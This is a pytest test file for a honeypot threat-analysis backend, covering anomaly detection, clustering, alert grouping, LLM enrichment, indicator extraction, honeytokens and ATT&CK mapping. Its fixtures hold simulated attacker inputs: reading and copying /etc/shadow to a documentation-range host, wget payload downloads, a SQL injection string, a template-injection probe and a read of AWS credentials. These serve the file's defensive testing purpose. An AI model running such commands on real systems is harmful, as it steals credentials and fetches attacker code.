"""The analysis pipeline end to end: models, alerts, signals and the model stages.

Runs against the test database through the ingest route, with the decision
model and the language model replaced by canned answers.
"""

import pickle
from datetime import datetime, timedelta, timezone

import numpy as np
import pytest
from sqlalchemy import select

from app.ai import llm
from app.ai.anomaly_detector import ANOMALY_FEATURES, AnomalyDetector, features_from_session
from app.ai.clustering import MIN_SESSIONS_TO_FIT, BehaviouralClusterer, extract
from app.ai.decider import decider
from app.ai.session_view import rebuild_session_data, run_rules
from app.core.config import get_settings
from app.models import Alert, AlertStatus, HoneypotSession, IndicatorOfCompromise, UserRole
from app.services import alerts as alert_service
from app.services import enrichment
from test_decision_triage import COMPROMISE, GATHERING, _enable, _fake_triage, _row
from test_operations_round import ATTACK, BROWSING, _ingest, _node

BRUTE_FORCE = {**ATTACK, "commands": [], "failed_logins": 12}
COMPROMISED = {
    **ATTACK,
    "commands": ["cat /etc/shadow", "scp /etc/shadow loot@198.51.100.7:/tmp/", "wget http://198.51.100.9/m -O /tmp/m"],
}


@pytest.fixture(autouse=True)
def models_up():
    enrichment._decider_down_until = 0.0
    enrichment._chimera_down_until = 0.0
    yield


async def _detail(client, headers, session_id):
    return (await client.get(f"/api/v1/sessions/{session_id}", headers=headers)).json()


# -- A2: the anomaly detector ---------------------------------------------------

class TestAnomalyDetector:
    def test_inputs_come_from_what_the_engine_sends(self):
        features = features_from_session({
            "commands": ["uname -a", "false"], "duration_seconds": 60, "keystroke_count": 20,
            "transcript": [{"command": "uname -a", "exit_code": 0}, {"command": "false", "exit_code": 1}],
            "packets": [{"type": "attack_detected"}] * 4, "failed_logins": 2,
        })
        assert set(features) == set(ANOMALY_FEATURES)
        assert features["error_rate"] == 0.5 and features["probe_count"] == 0.2
        assert features["command_rate"] > 0 and features["keystrokes_per_command"] == 0.25
        # The three keys nothing ever sent, and the server's clock.
        assert not {"connection_rate", "port_scan_count", "off_hours"} & set(ANOMALY_FEATURES)

    def test_the_bootstrap_scores_but_flags_nothing(self, tmp_path):
        detector = AnomalyDetector(path=str(tmp_path / "if.pkl"))
        result = detector.detect({name: 0.95 for name in ANOMALY_FEATURES})
        assert result["model_source"] == "synthetic" and result["calibrated"] is False
        assert result["is_anomalous"] is False and result["anomaly_score"] > 0
        assert not (tmp_path / "if.pkl").exists(), "the bootstrap must not be written to disk"

    def test_the_old_persisted_bootstrap_is_not_reloaded_as_pretrained(self, tmp_path):
        from sklearn.ensemble import IsolationForest

        path = tmp_path / "if.pkl"
        with open(path, "wb") as handle:
            pickle.dump(IsolationForest(n_estimators=5, random_state=0).fit(np.random.rand(50, 11)), handle)
        detector = AnomalyDetector(path=str(path))
        assert detector.detect({})["model_source"] == "synthetic"

    def test_a_fit_needs_enough_sessions_and_records_itself(self, tmp_path):
        path = str(tmp_path / "if.pkl")
        detector = AnomalyDetector(path=path)
        rows = [features_from_session({"commands": ["id"] * (i % 7), "duration_seconds": i}) for i in range(60)]
        with pytest.raises(ValueError, match="at least"):
            detector.fit(rows)
        record = detector.fit(rows, min_sessions=50, contamination=0.1)
        assert record["source"] == "sessions" and record["n"] == 60 and record["contamination"] == 0.1
        assert record["fitted_at"] and record["git_revision"]
        assert detector.detect(rows[0])["calibrated"] is True

    def test_another_process_notices_a_new_model_file(self, tmp_path):
        path = str(tmp_path / "if.pkl")
        worker = AnomalyDetector(path=path)
        assert worker.detect({})["calibrated"] is False
        rows = [features_from_session({"commands": ["id"] * (i % 7), "duration_seconds": i}) for i in range(60)]
        AnomalyDetector(path=path).fit(rows, min_sessions=50)
        result = worker.detect({})
        assert result["calibrated"] is True and result["model_source"] == "sessions"
        assert result["fitted_on"] == 60

    async def test_an_uncalibrated_score_reaches_neither_the_flag_nor_alerts(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        # A threshold that fires on any anomaly score at all.
        await client.post("/api/v1/settings/thresholds", headers=headers,
                          json={"name": "anomaly", "min_severity": "critical", "anomaly_score_threshold": 0.01})
        result = await _ingest(client, node_id, BROWSING)
        body = await _detail(client, headers, result["session_id"])
        assert body["is_anomalous"] is False and body["anomaly_score"] is not None
        assert body["signals"]["anomaly"]["calibrated"] is False
        assert result["alert"] is None


# -- A3: clustering -----------------------------------------------------------------

def _vectors(n=80):
    rng = np.random.default_rng(1)
    return np.vstack([rng.normal(0, 1, (n // 2, 10)), rng.normal(6, 1, (n - n // 2, 10))])


class TestClustering:
    def test_a_fit_records_its_quality(self, tmp_path):
        clusterer = BehaviouralClusterer(path=str(tmp_path / "c.pkl"))
        stats = clusterer.fit(_vectors())
        assert stats["k"] == 2 and stats["n"] == 80 and stats["silhouette"] > 0.5
        assert stats["fitted_at"] and clusterer.metadata["k"] == 2

    def test_a_worker_started_before_the_fit_notices_the_model(self, tmp_path):
        path = str(tmp_path / "c.pkl")
        worker = BehaviouralClusterer(path=path)
        assert worker.assign(np.zeros(10))["fitted"] is False
        BehaviouralClusterer(path=path).fit(_vectors())
        assert worker.assign(np.zeros(10))["fitted"] is True

    async def test_fit_and_ingest_build_the_same_vector(self, client, auth_headers, db_session):
        node_id, _ = await _node(client, auth_headers)
        web = {
            **BROWSING,
            # The engine sends the count and the attempts it was counted from.
            "credentials": [{"username": "admin", "password": "x", "success": False}],
            "commands": ["GET /p?q=1' UNION SELECT 1--  [ua: sqlmap/1.7]", "POST /upload  [ua: x]\ncd /tmp; wget http://198.51.100.9/a -O a"],
            "transcript": [
                {"command": "GET /p?q=1' UNION SELECT 1--  [ua: sqlmap/1.7]", "output": "", "exit_code": 0, "timestamp": 1.0},
                {"command": "POST /upload  [ua: x]\ncd /tmp; wget http://198.51.100.9/a -O a", "output": "", "exit_code": 0, "timestamp": 2.0},
            ],
        }
        result = await _ingest(client, node_id, web)
        at_ingest = extract(web, run_rules(web))
        row = await _row(db_session, result["session_id"])
        rebuilt = rebuild_session_data(row)
        assert rebuilt["commands"] == web["commands"], "a request and its body must stay one command"
        assert list(extract(rebuilt, run_rules(rebuilt))) == list(at_ingest)
        assert at_ingest[4] >= 2, "the web session's tools must be counted (the fit used to drop the protocol)"

    async def test_the_scheduled_fit_backfills_stored_rows(self, client, auth_headers, db_session, tmp_path, monkeypatch):
        from app.ai import maintenance
        from app.ai.clustering import clusterer

        monkeypatch.setattr(clusterer, "_explicit_path", str(tmp_path / "c.pkl"))
        monkeypatch.setattr(clusterer, "_loaded", False)
        node_id, _ = await _node(client, auth_headers)
        for i in range(MIN_SESSIONS_TO_FIT + 4):
            payload = ATTACK if i % 2 else {**BROWSING, "duration_seconds": 1.0 + i}
            await _ingest(client, node_id, {**payload, "attacker_ip": f"203.0.113.{i % 250}"})
        assert await maintenance.maintain_clusters(db_session) is not None
        rows = (await db_session.execute(select(HoneypotSession))).scalars().all()
        assert all(r.cluster_id is not None for r in rows)
        # Nothing is due straight after a fit.
        assert await maintenance.maintain_clusters(db_session) is None


# -- B8: alert grouping ----------------------------------------------------------------

class TestAlertGrouping:
    async def test_a_later_compromise_takes_over_the_brute_force_alert(self, client, auth_headers, db_session):
        node_id, headers = await _node(client, auth_headers)
        first = await _ingest(client, node_id, BRUTE_FORCE)
        second = await _ingest(client, node_id, COMPROMISED)
        assert first["alert"]["action"] == "created"
        assert second["alert"]["action"] == "grouped" and second["alert"]["lead_changed"] is True
        [alert] = (await client.get("/api/v1/alerts/", headers=headers)).json()["alerts"]
        assert alert["session_id"] == second["session_id"]
        assert alert["session_ids"] == [first["session_id"], second["session_id"]]
        assert alert["occurrences"] == 2 and alert["severity"] == "critical"
        assert "exfiltration" in alert["description"] and alert["title"].startswith("Data exfiltration")

    async def test_a_less_serious_repeat_changes_only_the_count(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        first = await _ingest(client, node_id, COMPROMISED)
        second = await _ingest(client, node_id, BRUTE_FORCE)
        assert second["alert"]["lead_changed"] is False
        [alert] = (await client.get("/api/v1/alerts/", headers=headers)).json()["alerts"]
        assert alert["session_id"] == first["session_id"] and len(alert["session_ids"]) == 2

    async def test_the_window_is_fixed_from_creation_not_sliding(self, client, auth_headers, db_session):
        node_id, headers = await _node(client, auth_headers)
        first = await _ingest(client, node_id, ATTACK)
        alert = (await db_session.execute(select(Alert))).scalar_one()
        # Created just over a window ago, but seen again a minute ago: the
        # old sliding window would still fold into it.
        window = get_settings().ALERT_DEDUP_WINDOW_MINUTES
        alert.created_at = datetime.now(timezone.utc) - timedelta(minutes=window + 5)
        alert.last_seen_at = datetime.now(timezone.utc) - timedelta(minutes=1)
        await db_session.commit()
        second = await _ingest(client, node_id, ATTACK)
        assert second["alert"]["action"] == "created"
        assert second["alert"]["alert_id"] != first["alert"]["alert_id"]

    async def test_two_workers_opening_the_same_alert_end_with_one(self, client, auth_headers, db_session, monkeypatch):
        node_id, headers = await _node(client, auth_headers)
        await _ingest(client, node_id, ATTACK)
        # The second worker looked before the first one's insert landed.
        real, calls = alert_service._open_alert, []

        async def racing(db, dedup_key, window):
            calls.append(1)
            return None if len(calls) == 1 else await real(db, dedup_key, window)

        monkeypatch.setattr(alert_service, "_open_alert", racing)
        second = await _ingest(client, node_id, ATTACK)
        assert second["alert"]["action"] == "grouped"
        assert len((await db_session.execute(select(Alert))).scalars().all()) == 1

    async def test_a_resolved_alert_does_not_block_a_new_one(self, client, auth_headers, db_session):
        node_id, headers = await _node(client, auth_headers)
        first = await _ingest(client, node_id, ATTACK)
        alert = (await db_session.execute(select(Alert))).scalar_one()
        alert.status = AlertStatus.RESOLVED
        await db_session.commit()
        second = await _ingest(client, node_id, ATTACK)
        assert second["alert"]["action"] == "created"
        keys = (await db_session.execute(select(Alert.group_key))).scalars().all()
        assert len(set(keys)) == 2

    async def test_the_description_names_the_evidence_not_a_borrowed_percentage(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        await _ingest(client, node_id, ATTACK)
        [alert] = (await client.get("/api/v1/alerts/", headers=headers)).json()["alerts"]
        assert "%" not in alert["description"]
        assert "by the rule layer" in alert["description"] and "brute force" in alert["description"]


# -- B2, B6: the model stages ---------------------------------------------------------------

UNMATCHED_WEB = {
    **BROWSING,
    "attacker_ip": "203.0.113.61",
    "failed_logins": 0,
    "commands": ["POST /api/render  [ua: Mozilla/5.0]\n{\"template\": \"{{7*7}}\"}"],
}


class TestModelStages:
    async def test_a_web_request_the_signatures_miss_is_still_queued(self, client, auth_headers, monkeypatch):
        _enable(monkeypatch)
        node_id, _ = await _node(client, auth_headers)
        result = await _ingest(client, node_id, UNMATCHED_WEB)
        assert result["ai_classification"]["category"] == "benign"
        assert result["triage_status"] == "pending" and result["enrichment_status"] == "triage"
        browsing = await _ingest(client, node_id, BROWSING)
        assert browsing["enrichment_status"] == "skipped"

    async def test_triage_that_finds_more_raises_an_alert_and_flags_the_disagreement(
        self, client, auth_headers, db_session, monkeypatch
    ):
        _enable(monkeypatch, chimera=False)
        node_id, headers = await _node(client, auth_headers)
        await client.post("/api/v1/settings/thresholds", headers=headers,
                          json={"name": "medium-up", "min_severity": "medium"})
        result = await _ingest(client, node_id, UNMATCHED_WEB)
        assert result["alert"] is None
        _fake_triage(monkeypatch, COMPROMISE)
        assert await enrichment.run_once(db_session) is True
        body = await _detail(client, headers, result["session_id"])
        assert body["attack_category"] == "benign", "the stored verdict stays the rule layer's"
        assert body["signals"]["disagreement"]["rules"] == "benign"
        assert body["signals"]["disagreement"]["triage"]["category"] == "exploitation"
        [alert] = (await client.get("/api/v1/alerts/", headers=headers)).json()["alerts"]
        assert alert["session_id"] == result["session_id"] and "triage" in alert["description"]

    async def test_triage_that_agrees_raises_nothing(self, client, auth_headers, db_session, monkeypatch):
        _enable(monkeypatch, chimera=False)
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        _fake_triage(monkeypatch, COMPROMISE)
        await enrichment.run_once(db_session)
        body = await _detail(client, headers, result["session_id"])
        assert "disagreement" not in body["signals"]
        assert len((await client.get("/api/v1/alerts/", headers=headers)).json()["alerts"]) == 1

    def test_silence_from_the_rules_on_a_long_transcript_is_not_agreement(self):
        low = {"p_low": 0.97, "p_compromise": 0.03}
        assert enrichment.route_after_triage("pending", "benign", low, rules_silent=True, partial_read=True)[0] == "pending"
        assert enrichment.route_after_triage("pending", "benign", low, rules_silent=True, partial_read=False)[0] == "skipped"
        assert enrichment.route_after_triage("pending", "reconnaissance", low, rules_silent=False, partial_read=True)[0] == "skipped"

    async def test_a_long_session_the_rules_found_nothing_in_goes_to_the_language_model(
        self, client, auth_headers, db_session, monkeypatch
    ):
        _enable(monkeypatch)
        node_id, headers = await _node(client, auth_headers)
        padded = {**ATTACK, "failed_logins": 0, "commands": [f"echo step {i}" for i in range(120)]}
        result = await _ingest(client, node_id, padded)
        _fake_triage(monkeypatch, GATHERING)
        await enrichment.run_once(db_session)
        row = await _row(db_session, result["session_id"])
        assert row.enrichment_status == "pending" and row.triage["route"] == "pending"
        assert row.triage["partial_read"] is True

    async def test_unknown_technique_ids_from_the_model_are_set_aside(self, client, auth_headers, db_session, monkeypatch):
        _enable(monkeypatch, decision=False)
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)

        async def fake_analyse(commands, protocol="ssh"):
            return {
                "intent": "x", "objectives": [], "confidence": 0.99, "sophistication": "automated", "model": "wolfram",
                "mitre_techniques": [
                    {"id": "T9999", "name": "Made Up"},
                    {"id": "T1190.001", "name": "Exploit Public-Facing Application"},
                    {"id": "T1486", "name": "SQL injection"},
                ],
                "iocs": {"hosts": ["198.51.100.9"], "urls": [], "files": []},
            }

        monkeypatch.setattr(llm.chimera, "analyse", fake_analyse)
        await enrichment.run_once(db_session)
        row = await _row(db_session, result["session_id"])
        by_id = {t["id"]: t for t in row.mitre_techniques}
        assert "T9999" not in by_id and "T1190.001" not in by_id
        assert by_id["T1190"]["source"] == "chimera" and by_id["T1190"]["claimed_id"] == "T1190.001"
        assert by_id["T1486"]["name"] == "Data Encrypted for Impact"
        assert by_id["T1486"]["claimed_name"] == "SQL injection"
        # The model's confidence in its answer is not a confidence in one technique.
        assert by_id["T1486"]["confidence"] is None
        assert [t["id"] for t in row.enrichment["unverified_techniques"]] == ["T9999"]
        indicator = (await db_session.execute(
            select(IndicatorOfCompromise).where(IndicatorOfCompromise.session_id == row.id,
                                                IndicatorOfCompromise.value == "198.51.100.9")
        )).scalars().all()
        assert {i.ioc_type for i in indicator} == {"referenced_ip"}

    async def test_an_answer_is_not_reused_across_protocols_or_prompt_versions(
        self, client, auth_headers, db_session, monkeypatch
    ):
        _enable(monkeypatch, decision=False)
        node_id, _ = await _node(client, auth_headers)
        await _ingest(client, node_id, ATTACK)
        await _ingest(client, node_id, {**ATTACK, "protocol": "telnet", "attacker_ip": "203.0.113.98"})
        third = await _ingest(client, node_id, {**ATTACK, "attacker_ip": "203.0.113.99"})
        calls = []

        async def fake_analyse(commands, protocol="ssh"):
            calls.append(protocol)
            return {"intent": "x", "objectives": [], "mitre_techniques": [], "confidence": 0.5,
                    "iocs": {"hosts": [], "urls": [], "files": []}, "sophistication": "automated", "model": "wolfram"}

        monkeypatch.setattr(llm.chimera, "analyse", fake_analyse)
        await enrichment.run_once(db_session)
        await enrichment.run_once(db_session)
        assert calls == ["ssh", "telnet"], "another protocol is another question"
        # The stored answer came from an older prompt: not reused either.
        first = await _row(db_session, 1)
        first.enrichment = {**first.enrichment, "prompt_version": "0"}
        await db_session.commit()
        await enrichment.run_once(db_session)
        assert len(calls) == 3
        assert (await _row(db_session, third["session_id"])).enrichment["reused_from_session"] is None


# -- B7: indicators --------------------------------------------------------------------------------

class TestIndicators:
    async def test_a_typed_address_is_a_referenced_ip_and_the_source_stays_ip(self, client, auth_headers, db_session):
        node_id, _ = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        rows = (await db_session.execute(
            select(IndicatorOfCompromise).where(IndicatorOfCompromise.session_id == result["session_id"])
        )).scalars().all()
        types = {(r.ioc_type, r.value): r.tags for r in rows}
        assert types[("ip", ATTACK["attacker_ip"])] == ["attacker_ip"]
        assert types[("referenced_ip", "198.51.100.9")] == ["referenced_ip"]
        assert ("ip", "198.51.100.9") not in types

    async def test_an_overlong_url_does_not_fail_the_ingest(self, client, auth_headers, db_session):
        node_id, _ = await _node(client, auth_headers)
        url = "http://198.51.100.9/" + "a" * 900
        result = await _ingest(client, node_id, {**ATTACK, "commands": [f"wget {url} -O /tmp/a"]})
        values = (await db_session.execute(
            select(IndicatorOfCompromise.value).where(IndicatorOfCompromise.session_id == result["session_id"],
                                                      IndicatorOfCompromise.ioc_type == "url")
        )).scalars().all()
        assert len(values) == 1 and len(values[0]) <= 500 and "sha256:" in values[0]

    async def test_the_backfill_retypes_old_rows(self, client, auth_headers, db_session):
        from app.tools.reanalyze import backfill_referenced_ip

        node_id, _ = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        db_session.add(IndicatorOfCompromise(session_id=result["session_id"], ioc_type="ip",
                                             value="192.0.2.77", tags=["referenced_ip"]))
        await db_session.commit()
        assert await backfill_referenced_ip(db_session) == 1
        await db_session.commit()
        old = (await db_session.execute(
            select(IndicatorOfCompromise).where(IndicatorOfCompromise.value == "192.0.2.77")
        )).scalar_one()
        assert old.ioc_type == "referenced_ip"


# -- C1, C2, C3: signals on a session ------------------------------------------------------------------

class TestSessionSignals:
    async def test_a_canary_trigger_is_recorded_and_alerted(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, {
            **BROWSING, "protocol": "ssh", "commands": ["cat /etc/motd"], "failed_logins": 0,
            "events": [{"event_type": "ai_canary_triggered", "canary": "motd-note", "channel": "ssh", "detail": "ran it"}],
        })
        body = await _detail(client, headers, result["session_id"])
        assert body["signals"]["ai_agent"]["canary"] is True and body["signals"]["ai_agent"]["score"] == 1.0
        assert [a["signal"] for a in result["signal_alerts"]] == ["canary"]
        [alert] = (await client.get("/api/v1/alerts/", headers=headers)).json()["alerts"]
        assert "canary" in alert["title"].lower() and alert["severity"] == "medium"

    async def test_a_honeytoken_raises_a_high_alert_and_links_the_session_that_read_it(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        reader = await _ingest(client, node_id, {
            **BROWSING, "protocol": "ssh", "attacker_ip": "203.0.113.70", "failed_logins": 0,
            "commands": ["cat /home/admin/.aws/credentials"],
        })
        user = await _ingest(client, node_id, {
            **BROWSING, "protocol": "ssh", "attacker_ip": "203.0.113.71", "commands": [], "failed_logins": 0,
            "events": [{"event_type": "honeytoken_used", "token_id": "aws-key-7", "kind": "aws_key",
                        "detail": "read from /home/admin/.aws/credentials"}],
        })
        body = await _detail(client, headers, user["session_id"])
        assert body["signals"]["honeytoken"]["token_ids"] == ["aws-key-7"]
        assert body["signals"]["severity"] == "high" and body["attack_category"] == "exploitation"
        related = body["signals"]["honeytoken"]["related_sessions"]
        assert [r["session_id"] for r in related] == [reader["session_id"]]
        alerts = (await client.get("/api/v1/alerts/?attacker_ip=203.0.113.71", headers=headers)).json()["alerts"]
        assert any("Honeytoken" in a["title"] and a["severity"] in ("high", "critical") for a in alerts)

    async def test_fingerprints_are_stored_and_exported(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        prints = {"ssh_client_version": "SSH-2.0-libssh_0.9.6", "hassh": "b5752e36ba6c5979a575e43178908adf"}
        result = await _ingest(client, node_id, {**ATTACK, "fingerprints": prints})
        assert (await _detail(client, headers, result["session_id"]))["fingerprints"] == prints
        listed = (await client.get("/api/v1/sessions/", headers=headers)).json()["sessions"][0]
        assert listed["fingerprints"] == prints and listed["signals"]["severity"]
        exported = (await client.post("/api/v1/export/?format=json", headers=headers)).json()
        assert exported[0]["session"]["fingerprints"] == prints

    async def test_cold_and_warm_runs_are_told_apart(self, client, auth_headers, monkeypatch):
        from app.services import analysis

        node_id, headers = await _node(client, auth_headers)
        monkeypatch.setattr(analysis, "_models_ready", False)
        cold = await _ingest(client, node_id, ATTACK)
        warm = await _ingest(client, node_id, {**ATTACK, "attacker_ip": "203.0.113.44"})
        assert cold["analysis_cold"] is True and warm["analysis_cold"] is False
        assert (await _detail(client, headers, warm["session_id"]))["signals"]["timing"]["cold"] is False

    async def test_preloading_makes_the_first_session_warm(self, client, auth_headers, monkeypatch):
        from app.services import analysis

        monkeypatch.setattr(analysis, "_models_ready", False)
        await analysis.warm_up()
        node_id, _ = await _node(client, auth_headers)
        assert (await _ingest(client, node_id, ATTACK))["analysis_cold"] is False


# -- refused connections --------------------------------------------------------------------------------------

REFUSAL = {
    "protocol": "ssh", "attacker_ip": "203.0.113.200", "attacker_port": 0, "status": "completed",
    "duration_seconds": 0.0, "commands": [], "failed_logins": 0,
    "events": [{"event_type": "connection_refused", "reason": "rate_limit", "count": 40, "first_seen": 1.0}],
}


class TestRefusals:
    async def test_a_refused_connection_is_not_a_session(self, client, auth_headers, monkeypatch):
        _enable(monkeypatch)
        node_id, headers = await _node(client, auth_headers)
        await client.post("/api/v1/settings/thresholds", headers=headers, json={"name": "all", "min_severity": "low"})
        result = await _ingest(client, node_id, REFUSAL)
        assert result["ai_classification"]["category"] == "benign"
        assert result["alert"] is None and result["iocs"] == []
        assert result["enrichment_status"] == "none" and result["triage_status"] == "none"
        assert result["signals"]["refusal"] is True
        await _ingest(client, node_id, ATTACK)
        stats = (await client.get("/api/v1/dashboard/stats", headers=headers)).json()
        assert stats["total_sessions"] == 1 and stats["unique_threat_origins"] == 1
        assert stats["timezone"] == "UTC"


# -- ATT&CK routes ------------------------------------------------------------------------------------------------

class TestAttackRoutes:
    async def test_the_matrix_counts_sessions_per_technique_in_kill_chain_order(self, client, auth_headers):
        from app.ai.attack_catalog import catalog

        node_id, headers = await _node(client, auth_headers)
        await _ingest(client, node_id, ATTACK)
        await _ingest(client, node_id, {**ATTACK, "attacker_ip": "203.0.113.43"})
        await _ingest(client, node_id, BROWSING)
        body = (await client.get("/api/v1/attack/matrix", headers=headers)).json()
        assert body["sessions"] == 3 and body["attack_version"] == catalog.version
        assert [t["id"] for t in body["tactics"]] == [t["id"] for t in catalog.tactics]
        by_tactic = {t["name"]: {x["id"]: x for x in t["techniques"]} for t in body["tactics"]}
        assert by_tactic["Command and Control"]["T1105"]["count"] == 2
        assert by_tactic["Command and Control"]["T1105"]["name"] == "Ingress Tool Transfer"
        assert by_tactic["Credential Access"]["T1110"]["count"] == 2
        filtered = (await client.get("/api/v1/attack/matrix?protocol=https", headers=headers)).json()
        assert filtered["sessions"] == 1 and not any(t["techniques"] for t in filtered["tactics"])
        assert (await client.get("/api/v1/attack/matrix?protocol=nonsense", headers=headers)).status_code == 400

    async def test_the_navigator_layer_is_a_layer_file_for_analysts(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        await _ingest(client, node_id, ATTACK)
        response = await client.get("/api/v1/attack/navigator-layer", headers=headers)
        assert response.status_code == 200 and "attachment" in response.headers["content-disposition"]
        layer = response.json()
        assert layer["domain"] == "enterprise-attack" and layer["versions"]["layer"] == "4.5"
        scored = {t["techniqueID"]: t for t in layer["techniques"]}
        assert scored["T1105"]["score"] == 1 and scored["T1105"]["tactic"] == "command-and-control"
        viewer = await auth_headers(UserRole.VIEWER)
        assert (await client.get("/api/v1/attack/navigator-layer", headers=viewer)).status_code == 403
        assert (await client.get("/api/v1/attack/matrix", headers=viewer)).status_code == 200


# -- tools ------------------------------------------------------------------------------------------------------------

class TestTools:
    async def test_reanalysis_cleans_stored_techniques_against_the_catalog(self, client, auth_headers, db_session):
        from collections import Counter

        from app.tools.reanalyze import clean_attack, count_id_validity

        node_id, _ = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        row = await _row(db_session, result["session_id"])
        row.mitre_techniques = [
            {"id": "T1190.001", "name": "Exploit Public-Facing Application", "source": "chimera"},
            {"id": "T9999", "name": "Nonsense", "source": "chimera"},
            {"id": "T1105", "name": "Wrong Name", "source": "tool:wget_curl"},
        ]
        row.mitre_tactics = ["TA0010"]
        counts = Counter()
        count_id_validity(row.mitre_techniques, counts)
        assert counts == {"name_matched": 1, "unverified": 1, "valid": 1}
        assert clean_attack(row) is True
        assert {t["id"]: t["name"] for t in row.mitre_techniques} == {
            "T1190": "Exploit Public-Facing Application", "T1105": "Ingress Tool Transfer",
        }
        assert row.mitre_tactics == ["TA0001", "TA0011"]
        assert clean_attack(row) is False

    def test_the_decider_evidence_file_carries_its_provenance(self):
        import argparse

        from app.tools.eval_decider import evidence_header

        args = argparse.Namespace(model_description="Kev-4B Q8_0, 6 threads", what=None)
        header = evidence_header(args, what="a measurement")
        assert header["what"] == "a measurement" and header["model"] == "Kev-4B Q8_0, 6 threads"
        assert header["measured"] and header["git_revision"] and "arguments" in header


def test_the_session_response_keeps_the_fields_of_the_new_event_types():
    """The schema used to list only the dropper and diversion fields, so a
    canary or honeytoken event reached the console as a bare event type."""
    from app.schemas import NetworkEvent

    canary = NetworkEvent(event_type="ai_canary_triggered", canary="c1", channel="shell", detail="ran the marker")
    token = NetworkEvent(event_type="honeytoken_used", token_id="db-password", kind="credential", detail="ssh login")
    forward = NetworkEvent(event_type="direct_tcpip", dest_host="192.0.2.7", dest_port=25, orig_host="10.0.0.1", orig_port=4000)
    refused = NetworkEvent(event_type="connection_refused", reason="rate_limited", count=12, first_seen=1.0)

    assert canary.model_dump(exclude_none=True) == {
        "event_type": "ai_canary_triggered", "canary": "c1", "channel": "shell", "detail": "ran the marker",
    }
    assert token.token_id == "db-password" and token.kind == "credential"
    assert (forward.dest_host, forward.dest_port, forward.orig_port) == ("192.0.2.7", 25, 4000)
    assert refused.count == 12 and refused.first_seen == 1.0
